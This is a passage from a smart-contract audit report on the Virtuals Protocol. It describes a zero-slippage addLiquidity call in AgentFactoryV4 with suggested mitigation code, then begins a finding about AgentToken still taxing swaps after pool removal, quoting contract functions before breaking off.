href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactoryV4.sol#L230-L239\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-2\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-2\" aria-label=\"finding description and impact 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the \u003ccode\u003e_executeApplication\u003c/code\u003e in \u003ccode\u003eAgentFactoryV4\u003c/code\u003e, during the process of adding liquidity using Uniswap’s \u003ccode\u003eIUniswapV2Router02.addLiquidity\u003c/code\u003e method, slippage tolerance is set to 0 for both \u003ccode\u003etoken\u003c/code\u003e and \u003ccode\u003eassetToken\u003c/code\u003e. Specifically, in the following line:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// slippage tolerance for token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// slippage tolerance for assetToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHere, the \u003ccode\u003e0\u003c/code\u003e values for slippage tolerance mean that the liquidity addition will fail if the price of either \u003ccode\u003etoken\u003c/code\u003e or \u003ccode\u003eassetToken\u003c/code\u003e fluctuates even slightly between when the transaction is initiated and when it’s executed. This is because Uniswap requires that the amount of tokens being swapped remains within a certain tolerance range to prevent slippage.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo mitigate this issue, the following steps are recommended:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIntroduce slippage protection\u003c/strong\u003e: Modify the \u003ccode\u003eaddLiquidity\u003c/code\u003e call to include a non-zero slippage tolerance. This ensures that the liquidity addition will proceed within a reasonable range of price variation.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e50\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 0.5% slippage tolerance (adjustable)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eslippageTolerance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Router02\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetAmountMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eslippageTolerance\u003c/code\u003e: The percentage tolerance for slippage. This should be adjusted based on the application’s tolerance for price fluctuation (e.g., 0.5% or 1%).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etokenAmountMin\u003c/code\u003e and \u003ccode\u003eassetAmountMin\u003c/code\u003e: These variables calculate the minimum acceptable amounts of \u003ccode\u003etoken\u003c/code\u003e and \u003ccode\u003eassetToken\u003c/code\u003e that will be added to the liquidity pool, accounting for slippage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\" style=\"position:relative;\"\u003e\u003ca href=\"#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps\" aria-label=\"m 13 removal of a liquidity pool on agenttokenremoveliquiditypool still incurs taxes on swaps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-51\"\u003e[M-13] Removal of a liquidity pool on \u003ccode\u003eAgentToken::removeLiquidityPool\u003c/code\u003e still incurs taxes on swaps\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-558\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L279\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-7\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-7\" aria-label=\"finding description 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentToken.sol\u003c/code\u003e contract uses tax mechanism whenever swaps take place for the added liquidity pools, which can be observed in the transfer functions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_transfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisLiquidityPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));      \u0026lt;\u0026lt; @ - \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// if `isLiquidityPool` returns true, then taxes are levied.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe liquidity pools are added via \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L300\"\u003e\u003ccode\u003eAgentToken::addLiquidityPool\u003c/code\u003e\u003c/a\u003e and during the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L193\"\u003e\u003ccode\u003eAgentToken::_createPair\u003c/code\u003e\u003c/a\u003e call, which takes place during \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L106\"\u003e\u003ccode\u003einitialize\u003c/code\u003e\u003c/a\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euniswapV2Pair_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIUniswapV2Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eLiquidityPoolCreated\u003c/span\u003e\u003cspan 